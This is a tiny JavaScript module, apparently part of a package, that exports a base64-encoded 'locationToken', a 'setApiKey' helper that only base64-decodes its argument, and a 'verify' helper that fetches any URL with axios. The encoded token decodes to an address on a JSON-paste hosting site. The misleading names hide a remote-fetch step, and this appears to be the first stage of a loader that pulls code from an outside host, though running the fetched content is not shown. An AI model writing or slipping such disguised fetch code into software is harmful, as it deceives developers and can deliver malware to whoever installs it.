exports.locationToken = "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9VVkVYSA==";
exports.setApiKey = (s) => { return atob(s); };
exports.verify = (api) => { return axios.get(api); };
